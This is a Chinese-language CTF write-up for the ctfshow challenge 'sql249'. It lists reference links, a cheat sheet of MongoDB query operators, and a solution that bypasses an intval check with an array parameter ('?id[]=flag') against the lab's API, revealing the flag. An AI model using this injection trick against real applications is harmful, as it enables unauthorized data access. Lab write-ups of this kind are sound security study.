# ctfshow-sql249



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623

郁离歌大佬 https://blog.csdn.net/like98k/article/details/79436463

sql常见方法及udf提权   https://blog.csdn.net/qq_43645782/article/details/105468416

bit  https://www.xl-bit.cn/index.php/archives/93/





 查询语句 

```
  //无
  $user = $memcache->get($id);

	开始nosql,flag在flag中
```



 返回逻辑 

```
  //无过滤


```



```sql
补充一下nosql注入笔记
http://rui0.cn/archives/609
https://www.anquanke.com/post/id/97211





$gt : >
$lt : <
$gte: >=
$lte: <=
$ne : !=、<>
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/


//查询age = 22的记录
db.userInfo.find({"age": 22});
//相当于：select * from userInfo where age = 22;
//查询age > 22的记录
db.userInfo.find({age: {$gt: 22}});
//相当于：select * from userInfo where age > 22;



http://e7c3ca66-bf8b-4b17-bb2c-03b745b68a77.challenge.ctf.show/api/?id=1
{"code":0,"msg":"\u67e5\u8be2\u6210\u529f","count":1,"data":[{"id":"1","username":"user1","pass":"pass1"}]}

这题的话提示了flag在flag中，相当于找flag的值，正常肯定是id=flag，但是会返回error。
对于非空的数组，intval会返回1，应该可以绕过intval的检验：?id[]=flag

http://e7c3ca66-bf8b-4b17-bb2c-03b745b68a77.challenge.ctf.show/api/?id[]=flag

{"code":0,"msg":"\u67e5\u8be2\u6210\u529f","count":1,"data":[{"flag":"ctfshow{f968a986-9379-4396-b77f-2059d38d5a33}"}]}




```



























